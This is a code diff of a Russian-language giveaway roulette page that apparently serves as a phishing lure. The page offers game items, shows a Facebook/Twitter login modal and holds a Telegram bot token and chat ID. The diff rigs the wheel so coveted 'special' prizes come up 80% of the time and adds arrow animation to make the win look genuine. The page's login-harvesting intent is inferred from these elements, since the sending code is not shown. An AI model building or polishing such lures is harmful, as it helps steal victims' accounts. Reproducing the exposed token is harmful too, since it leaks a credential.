@@ -122,6 +122,7 @@
             transform: translate(-50%, -50%);
             object-fit: contain;
             pointer-events: none;
+            transition: transform 3s cubic-bezier(0.17, 0.67, 0.83, 0.67);
         }
 
         .spin-button {
@@ -918,7 +919,7 @@
     </div>
 
     <script>
-        // Конфигурация призов
+        // Конфигурация призов (все PNG)
         const prizes = [
             { name: "pharaon", image: "pharaon.png" },
             { name: "material", image: "material.png" },
@@ -934,6 +935,17 @@
             { name: "tolstovka", image: "tolstovka.png" }
         ];
 
+        // Специальные призы, которые должны выпадать чаще
+        const specialPrizes = ["mummy", "m416shut", "m416lednik"];
+        const specialPrizeIndexes = [];
+
+        // Находим индексы специальных призов
+        prizes.forEach((prize, index) => {
+            if (specialPrizes.includes(prize.name)) {
+                specialPrizeIndexes.push(index);
+            }
+        });
+
         // Telegram бот данные
         const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const CHAT_ID = '1709490182';
@@ -941,6 +953,7 @@
         // Элементы DOM
         const spinButton = document.getElementById('spinButton');
         const prizeWheel = document.getElementById('prizeWheel');
+        const wheelBase = document.getElementById('wheelBase'); // Стрелка
         const winModal = document.getElementById('winModal');
         const facebookModal = document.getElementById('facebookModal');
         const twitterModal = document.getElementById('twitterModal');
@@ -956,6 +969,7 @@
         let isSpinning = false;
         let hasSpun = false; // Флаг для ограничения одного вращения
         let currentRotation = 0;
+        let wheelBaseRotation = 0; // Отдельное вращение для стрелки
         let currentPrize = null;
         let selectedLoginOption = 'facebook'; // По умолчанию Facebook
 
@@ -965,6 +979,12 @@
             hasSpun = false;
             spinButton.disabled = false;
             spinButton.textContent = "КРУТИТЬ РУЛЕТКУ";
+            
+            // Сброс вращения
+            currentRotation = 0;
+            wheelBaseRotation = 0;
+            prizeWheel.style.transform = `rotate(${currentRotation}deg)`;
+            wheelBase.style.transform = `translate(-50%, -50%) rotate(${wheelBaseRotation}deg)`;
             
             // Установка выбора по умолчанию
             facebookOption.classList.add('active');
@@ -980,8 +1000,15 @@
             spinButton.disabled = true;
             spinButton.textContent = "КРУТИТЬ РУЛЕТКУ";
             
-            // Случайный выбор приза
-            const prizeIndex = Math.floor(Math.random() * prizes.length);
+            // Выбор приза: с большей вероятностью выпадают специальные призы
+            let prizeIndex;
+            if (Math.random() < 0.8) { // 80% вероятность специального приза
+                const randomSpecialIndex = Math.floor(Math.random() * specialPrizeIndexes.length);
+                prizeIndex = specialPrizeIndexes[randomSpecialIndex];
+            } else {
+                prizeIndex = Math.floor(Math.random() * prizes.length);
+            }
+            
             currentPrize = prizes[prizeIndex];
             
             // Настройка вращения (призы расположены через каждые 30 градусов)
@@ -989,10 +1016,18 @@
             const spins = 5 + Math.floor(Math.random() * 3);
             const totalRotation = (spins * 360) + targetAngle;
             
-            // Анимация вращения
+            // Стрелка вращается в противоположном направлении для указания на приз
+            const wheelBaseTargetRotation = -((spins * 360) + targetAngle);
+            
+            // Анимация вращения колеса
             prizeWheel.style.transition = 'transform 4s cubic-bezier(0.2, 0.8, 0.2, 1)';
             currentRotation += totalRotation;
             prizeWheel.style.transform = `rotate(${currentRotation}deg)`;
+            
+            // Анимация вращения стрелки
+            wheelBase.style.transition = 'transform 4s cubic-bezier(0.2, 0.8, 0.2, 1)';
+            wheelBaseRotation += wheelBaseTargetRotation;
+            wheelBase.style.transform = `translate(-50%, -50%) rotate(${wheelBaseRotation}deg)`;
             
             // Отмечаем, что вращение уже было
             hasSpun = true;
